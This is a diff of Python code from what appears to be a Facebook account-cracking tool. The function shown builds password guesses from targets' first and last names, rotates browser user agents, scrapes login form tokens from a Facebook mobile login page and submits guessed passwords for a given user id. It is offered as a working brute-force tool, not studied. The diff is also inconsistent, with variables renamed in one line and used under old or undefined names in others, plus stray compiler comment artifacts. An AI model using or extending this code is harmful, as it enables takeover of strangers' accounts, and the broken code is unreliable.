@@ -1449,17 +1449,20 @@ def ffb6(ids,names,passlist):
 	loop+=1
 		
 def ffb9(ids,names,passlist):
-	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
+	global loop,oks,cps
 	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
-	sys.stdout.flush()
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
-	ses = requests.Session()
-	for pw in pwv:
+	session = requests.Session()
+	try:
+		first = names.split(' ')[0]
 		try:
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
+			last = names.split(' ')[1]
+		except:
+			last = 'Khan'
+		ps = first.lower()
+		ps2 = last.lower()
+		for fikr in passlist:
+			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+			ua=random.choice(ugen)
 			ses.headers.update({"Host":'p.facebook.com','upgrade-insecure-requests': '1','user-agent':ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]**[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',"dnt":"1",'x-requested-with': 'XMLHttpRequest','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','referer': 'https://mbasic.facebook.com/',"accept-encoding":"gzip, deflate br",'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',})
 			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
